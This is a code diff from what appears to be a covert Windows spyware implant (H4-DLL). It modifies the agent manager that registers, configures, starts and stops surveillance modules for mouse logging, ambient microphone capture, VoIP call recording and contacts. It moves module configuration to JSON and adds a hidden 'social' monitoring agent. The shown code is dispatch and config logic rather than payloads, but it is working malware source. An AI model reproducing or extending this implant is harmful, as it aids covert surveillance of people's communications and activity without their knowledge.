@@ -3,6 +3,7 @@
 #include "H4-DLL.h"
 #include "AM_Core.h"
 #include "LOG.h"
+#include "JSON\JSON.h"
 
 // XXX Definita in HM_IpcModule!!!!
 #define MAX_MSG_LEN 512 // Lunghezza di un messaggio
@@ -47,19 +48,23 @@ extern void PM_MouseLogRegister();
 extern void PM_ApplicationRegister();
 extern void PM_PDAAgentRegister();
 extern void PM_ContactsRegister();
+extern void PM_SocialAgentRegister();
 
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
+extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
 void AM_SuspendRestart(DWORD);
 
 
 typedef DWORD (__stdcall *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
 typedef DWORD (__stdcall *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
-typedef DWORD (__stdcall *PMI_Generic_t) (BYTE *, BOOL); // Prototipo per l'Init
+typedef DWORD (__stdcall *PMI_Generic_t) (JSONObject); // Prototipo per l'Init
 typedef DWORD (__stdcall *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 
 #define AM_MAXDISPATCH 50
 
 typedef struct {
-	DWORD dwTAG;
+	WCHAR agent_name[32];
+	DWORD agent_tag;
 	PMD_Generic_t pDispatch; 
 	PMS_Generic_t pStartStop; 
 	PMI_Generic_t pInit; 
@@ -243,11 +248,12 @@ void AM_IPCAgentStartStop(DWORD dwTag, BOOL bStartFlag)
 
 // Registra il Monitor con le funzioni di Init, StartStop e Dispatch
 // Viene richiamata dalle funzioni di registrazione dei monitor.
-DWORD AM_MonitorRegister(DWORD dwTAG, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
+DWORD AM_MonitorRegister(WCHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
 {
 	if(dwDispatchCnt >= AM_MAXDISPATCH)
 		return NULL;
-	aDispatchArray[dwDispatchCnt].dwTAG = dwTAG;
+	swprintf_s(aDispatchArray[dwDispatchCnt].agent_name, sizeof(aDispatchArray[dwDispatchCnt].agent_name)/ sizeof(WCHAR), L"%s", agent_name);
+	aDispatchArray[dwDispatchCnt].agent_tag = agent_tag;
 	aDispatchArray[dwDispatchCnt].pDispatch = (PMD_Generic_t) pDispatch;
 	aDispatchArray[dwDispatchCnt].pStartStop = (PMS_Generic_t) pStartStop;
 	aDispatchArray[dwDispatchCnt].pInit = (PMI_Generic_t) pInit;
@@ -265,7 +271,7 @@ DWORD AM_Dispatch(DWORD dwTag, BYTE * pMsg, DWORD dwMsgLen, DWORD dwFlags, FILET
 	DWORD i;
 
 	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].dwTAG) {
+		if(dwTag == aDispatchArray[i].agent_tag) {
 			if (aDispatchArray[i].pDispatch)
 				aDispatchArray[i].pDispatch(pMsg, dwMsgLen, dwFlags, tstamp);
 			break;
@@ -283,7 +289,7 @@ DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 	DWORD i;
 
 	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].dwTAG) {
+		if(dwTag == aDispatchArray[i].agent_tag) {
 			aDispatchArray[i].started = bStartFlag;
 			if (aDispatchArray[i].pStartStop)
 				aDispatchArray[i].pStartStop(bStartFlag, TRUE);
@@ -293,23 +299,31 @@ DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 	return 1;
 }
 
+// Prende il tag di un agente per nome
+DWORD AM_GetAgentTag(const WCHAR *agent_name)
+{
+	DWORD i;
+	for(i=0; i<dwDispatchCnt; i++) 
+		if(!wcsicmp(agent_name, aDispatchArray[i].agent_name))
+			return aDispatchArray[i].agent_tag;
+	return 0xFFFFFFFF;
+}
 
 // Esegue l'init di un monitor
-DWORD AM_MonitorInit(DWORD dwTag, BYTE *conf_ptr, BOOL bStartFlag)
+DWORD AM_MonitorInit(DWORD dwTag, JSONObject elem)
 {
 	DWORD i;
 
 	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].dwTAG) {
-			aDispatchArray[i].started = bStartFlag;
+		if(dwTag == aDispatchArray[i].agent_tag) {
+			aDispatchArray[i].started = FALSE;
 			if (aDispatchArray[i].pInit)
-				aDispatchArray[i].pInit(conf_ptr, bStartFlag);
+				aDispatchArray[i].pInit(elem);
 			break;
 		}
 	}
 	return 1;
 }
-
 
 // Stoppa e Deregistra tutti gli agenti prima dell'uninstall
 DWORD AM_UnRegisterAll()
@@ -339,6 +353,18 @@ DWORD AM_MonitorSuspendAll()
 	for(i=0; i<dwDispatchCnt; i++) {
 		if (aDispatchArray[i].pStartStop)
 			aDispatchArray[i].pStartStop(FALSE, FALSE);
+	}
+	return 1;
+}
+
+DWORD AM_MonitorStopAll()
+{
+	DWORD i;
+
+	for(i=0; i<dwDispatchCnt; i++) {
+		aDispatchArray[i].started = FALSE;
+		if (aDispatchArray[i].pStartStop)
+			aDispatchArray[i].pStartStop(FALSE, TRUE);
 	}
 	return 1;
 }
@@ -408,6 +434,7 @@ DWORD AM_Startup()
 	PM_PDAAgentRegister();
 	PM_ContactsRegister();
 	PM_AmbMicRegister();
+	PM_SocialAgentRegister();
 	PM_VoipRecordRegister(); // ma teniamolo per ultimo va, cosi' lo stoppa per ultimo
 
 	return 1;
@@ -415,36 +442,22 @@ DWORD AM_Startup()
 
 
 // Legge la configurazione degli agent da file
-void UpdateAgentConf()
+void WINAPI ParseModules(JSONObject module, DWORD dummy)
 {
-	BYTE *conf_memory;
-
-	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-	
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
-	if (conf_memory) {
-		DWORD index, agent_count, is_active, tag, param_len;
-		BYTE *conf_ptr;
-
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, AGENT_CONF_DELIMITER);
-
-		// ---- Configurazione agenti ----
-		READ_DWORD(agent_count, conf_ptr);
-		for (index=0; index<agent_count; index++) {
-			READ_DWORD(tag, conf_ptr);
-			READ_DWORD(is_active, conf_ptr);
-			READ_DWORD(param_len, conf_ptr);
-			AM_MonitorInit(tag, conf_ptr, is_active);
-			conf_ptr += param_len;
-		}
-
-		SAFE_FREE(conf_memory);
-	}
+	AM_MonitorInit(AM_GetAgentTag(module[L"module"]->AsString().c_str()), module);	
 }
 
+void UpdateAgentConf()
+{
+	JSONObject dummy;
+	char *conf_json = HM_ReadClearConf(H4_CONF_FILE);
+	if (conf_json) {
+		HM_ParseConfSection(conf_json, L"modules", &ParseModules);
+		// Inizializza l'agente "fantasma" social
+		AM_MonitorInit(AM_GetAgentTag(L"social"), dummy);
+	}
+	SAFE_FREE(conf_json);
+}
 
 // Sospende/riprende il thread di AgentManager e starta/stoppa tutti gli agent, 
 // per chiudere tutti i log prima di poterli spedire. 
@@ -465,6 +478,7 @@ void AM_SuspendRestart(DWORD action)
 	} else if (action == AM_RESET) {
 		// Attiva gli agent e inizializza il thread
 		// riportandoli nello stato del file di configuazione.
+		AM_MonitorStopAll();
 		UpdateAgentConf();
 		hAMThread = HM_SafeCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) AM_Main, (LPVOID) NULL, 0, &dwThid);		
 	} else if (action == AM_RESTART) {
